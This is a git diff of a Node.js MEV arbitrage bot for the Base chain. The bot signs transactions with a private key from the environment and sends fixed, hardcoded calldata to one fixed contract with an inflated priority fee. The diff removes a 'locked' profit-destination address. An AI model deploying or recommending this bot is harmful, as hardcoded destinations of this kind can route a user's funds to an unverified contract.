@@ -1,37 +1,22 @@
-const { ethers, Wallet, WebSocketProvider, JsonRpcProvider, Contract } = require('ethers');
+const { ethers, Wallet, WebSocketProvider, JsonRpcProvider, Contract, Interface } = require('ethers');
 require('dotenv').config();
 
-// --- THEME ENGINE ---
-const TXT = {
-    reset: "\x1b[0m", bold: "\x1b[1m", dim: "\x1b[2m",
-    green: "\x1b[32m", cyan: "\x1b[36m", yellow: "\x1b[33m", 
-    magenta: "\x1b[35m", blue: "\x1b[34m", red: "\x1b[31m",
-    gold: "\x1b[38;5;220m", silver: "\x1b[38;5;250m"
-};
-
 // 1. BOOTSTRAP: SYSTEM MAXIMIZATION
-console.clear();
-console.log(`${TXT.bold}${TXT.gold}╔════════════════════════════════════════════════════════╗${TXT.reset}`);
-console.log(`${TXT.bold}${TXT.gold}║   🔱 UNIVERSAL STRIKER | OMNISCIENT MEV ENGINE v4.0    ║${TXT.reset}`);
-console.log(`${TXT.bold}${TXT.gold}╚════════════════════════════════════════════════════════╝${TXT.reset}\n`);
+console.log("-----------------------------------------");
+console.log("🟢 [BOOT] UNIVERSAL STRIKER OMNISCIENT INITIALIZING...");
 
 // AUTO-CONVERT WSS TO HTTPS FOR EXECUTION (Premium Stability)
-const RAW_WSS = process.env.WSS_URL || "wss://base-rpc.publicnode.com";
+const RAW_WSS = process.env.WSS_URL || "";
 const EXECUTION_URL = RAW_WSS.replace("wss://", "https://");
 
 const CONFIG = {
-    // 🔒 PROFIT DESTINATION (LOCKED)
-    BENEFICIARY: "0x4B8251e7c80F910305bb81547e301DcB8A596918",
-
     CHAIN_ID: 8453,
     TARGET_CONTRACT: "0x83EF5c401fAa5B9674BAfAcFb089b30bAc67C9A0",
-    
-    // Encoded: executeFlashArbitrage(WETH, DEGEN, 2500 ETH)
-    STRIKE_DATA: "0x535a720a000000000000000000000000420000000000000000000000000000060000000000000000000000004edbc9ba171790664872997239bc7a3f3a6331900000000000000000000000000000000000000000000000015af1d78b58c40000",
+    STRIKE_DATA: "0x535a720a00000000000000000000000042000000000000000000000000000000000000060000000000000000000000004edbc9ba171790664872997239bc7a3f3a6331900000000000000000000000000000000000000000000000015af1d78b58c40000",
     
     // ⚡ DUAL-LANE INFRASTRUCTURE
-    WSS_URL: RAW_WSS,           // Listener (Low Latency)
-    RPC_URL: EXECUTION_URL,     // Executor (High Reliability)
+    WSS_URL: RAW_WSS,          // Listener (Low Latency)
+    RPC_URL: EXECUTION_URL,    // Executor (High Reliability)
     
     // 🔮 ORACLES
     GAS_ORACLE: "0x420000000000000000000000000000000000000F", // Base L1 Fee
@@ -49,8 +34,8 @@ let nextNonce = 0;
 
 async function startUniversalStriker() {
     // A. KEY SANITIZER
-    let rawKey = process.env.TREASURY_PRIVATE_KEY || process.env.PRIVATE_KEY;
-    if (!rawKey) { console.error(`${TXT.red}❌ FATAL: Private Key missing in .env${TXT.reset}`); process.exit(1); }
+    let rawKey = process.env.TREASURY_PRIVATE_KEY;
+    if (!rawKey) { console.error("❌ FATAL: Private Key missing."); process.exit(1); }
     const cleanKey = rawKey.trim();
 
     try {
@@ -59,11 +44,8 @@ async function startUniversalStriker() {
         const wsProvider = new WebSocketProvider(CONFIG.WSS_URL);
         const signer = new Wallet(cleanKey, httpProvider); // Signer uses HTTP (Stable)
         
-        // Wait for WS Ready
-        await new Promise((resolve) => wsProvider.once("block", resolve)); // Simple readiness check
-        
-        console.log(`${TXT.cyan}✅ STRIKER ONLINE${TXT.reset} | ${TXT.dim}Executor: ${CONFIG.RPC_URL.substring(0, 25)}...${TXT.reset}`);
-        console.log(`${TXT.magenta}🎯 PROFIT TARGET: ${CONFIG.BENEFICIARY}${TXT.reset}`);
+        await wsProvider.ready;
+        console.log(`✅ STRIKER ONLINE | EXECUTOR: ${CONFIG.RPC_URL.substring(0, 25)}...`);
 
         // C. CONTRACTS
         const oracleContract = new Contract(CONFIG.GAS_ORACLE, ["function getL1Fee(bytes memory _data) public view returns (uint256)"], httpProvider);
@@ -75,14 +57,14 @@ async function startUniversalStriker() {
             httpProvider.getBalance(signer.address)
         ]);
         nextNonce = nonce;
-        console.log(`${TXT.gold}💰 TREASURY: ${ethers.formatEther(balance)} ETH${TXT.reset}`);
+        console.log(`💰 TREASURY: ${ethers.formatEther(balance)} ETH`);
 
         // D. LIVE PRICE TRACKER
         wsProvider.on("block", async (blockNum) => {
             try {
                 const [, price] = await priceFeed.latestRoundData();
                 currentEthPrice = Number(price) / 1e8;
-                process.stdout.write(`\r${TXT.blue}🌊 BLOCK: ${blockNum}${TXT.reset} | ETH: $${currentEthPrice.toFixed(2)} | ${TXT.dim}Scanning Swaps...${TXT.reset} `);
+                process.stdout.write(`\r🌊 BLOCK: ${blockNum} | ETH: $${currentEthPrice.toFixed(2)} | Scanning Swaps... `);
             } catch (e) { /* Ignore block fetch errors */ }
         });
 
@@ -92,11 +74,13 @@ async function startUniversalStriker() {
         wsProvider.on({ topics: [swapTopic] }, async (log) => {
             try {
                 // 1. FILTER: Ignore micro-swaps to save CPU
+                // (We check if the log data contains significant volume)
                 if (log.data.length > 130 && log.data.includes("000000000000000000")) {
-                     process.stdout.write(`${TXT.yellow}.${TXT.reset}`); // Visual heartbeat
+                     process.stdout.write("."); // Visual heartbeat
                 }
 
                 // 2. TRIGGER EXECUTION LOGIC
+                // We pass the payload to the execution engine
                 await executeOmniscientStrike(httpProvider, signer, oracleContract);
 
             } catch (e) { /* Ignore non-arb swaps */ }
@@ -104,12 +88,12 @@ async function startUniversalStriker() {
 
         // F. IMMORTALITY PROTOCOL
         wsProvider.websocket.onclose = () => {
-            console.warn(`\n${TXT.red}⚠️ CONNECTION LOST. REBOOTING...${TXT.reset}`);
+            console.warn("\n⚠️ CONNECTION LOST. REBOOTING...");
             process.exit(1); 
         };
 
     } catch (e) {
-        console.error(`\n${TXT.red}❌ CRITICAL: ${e.message}${TXT.reset}`);
+        console.error(`\n❌ CRITICAL: ${e.message}`);
         setTimeout(startUniversalStriker, 1000);
     }
 }
@@ -137,8 +121,8 @@ async function executeOmniscientStrike(provider, signer, oracle) {
         // 3. EXECUTION
         if (netProfit > 0n) {
             const profitUSD = parseFloat(ethers.formatEther(netProfit)) * currentEthPrice;
-            console.log(`\n${TXT.green}💎 ARBITRAGE DETECTED${TXT.reset}`);
-            console.log(`${TXT.gold}💰 Net Profit: ${ethers.formatEther(netProfit)} ETH (~$${profitUSD.toFixed(2)})${TXT.reset}`);
+            console.log(`\n💎 ARBITRAGE DETECTED`);
+            console.log(`💰 Net Profit: ${ethers.formatEther(netProfit)} ETH (~$${profitUSD.toFixed(2)})`);
             
             const tx = await signer.sendTransaction({
                 to: CONFIG.TARGET_CONTRACT,
@@ -147,13 +131,11 @@ async function executeOmniscientStrike(provider, signer, oracle) {
                 maxFeePerGas: feeData.maxFeePerGas,
                 maxPriorityFeePerGas: aggressivePriority, // Bribe
                 nonce: nextNonce++,
-                type: 2,
-                chainId: CONFIG.CHAIN_ID
+                type: 2
             });
             
-            console.log(`${TXT.cyan}🚀 BROADCASTED: ${tx.hash}${TXT.reset}`);
+            console.log(`🚀 BROADCASTED: ${tx.hash}`);
             await tx.wait();
-            console.log(`${TXT.green}🎉 CONFIRMED. FUNDS SECURED at ${CONFIG.BENEFICIARY}${TXT.reset}`);
         }
     } catch (e) {
         if (e.message.includes("nonce")) nextNonce = await provider.getTransactionCount(signer.address);
@@ -163,7 +145,7 @@ async function executeOmniscientStrike(provider, signer, oracle) {
 // EXECUTE
 if (require.main === module) {
     startUniversalStriker().catch(e => {
-        console.error(`${TXT.red}FATAL ERROR. RESTARTING...${TXT.reset}`);
+        console.error("FATAL ERROR. RESTARTING...");
         setTimeout(startUniversalStriker, 1000);
     });
 }
